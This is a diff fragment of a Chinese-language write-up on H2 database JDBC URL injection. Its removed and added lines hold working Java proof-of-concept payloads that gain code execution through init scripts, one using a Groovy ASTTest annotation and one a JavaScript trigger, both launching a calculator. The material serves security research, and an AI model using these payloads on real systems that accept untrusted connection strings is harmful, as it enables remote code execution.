@@ -51,25 +51,15 @@ private static boolean isGroovySource(String var0) {
   return var0.startsWith("//groovy") || var0.startsWith("@groovy");
 }
 ```
-
-但是也不是每个项目都有Groovy
-
+利用
 ```java
-	public static void main(String[] args) throws Exception {
-		Class.forName("org.h2.Driver");
-
-		String url = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n" +
-				"INFORMATION_SCHEMA.TABLES AS $$//javascript\n" +
-				"java.lang.Runtime.getRuntime().exec('open -na Calculator')\n" +
-				"$$\n";
-		Connection conn = DriverManager.getConnection(url);
-		conn.close();
-	}
+Class.forName("org.h2.Driver");
+String groovy = "@groovy.transform.ASTTest(value={" + " assert java.lang.Runtime.getRuntime().exec(\"calc\")" + "})" + "def x";
+String url    = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE ALIAS T5 AS '" + groovy + "'";
 ```
 
+但是也不是每个项目都有Groovy，这时候可以使用js执行命令
 
-
-## 无其他依赖通过Javascript
 
 ```
 	public static void main(String[] args) throws Exception {
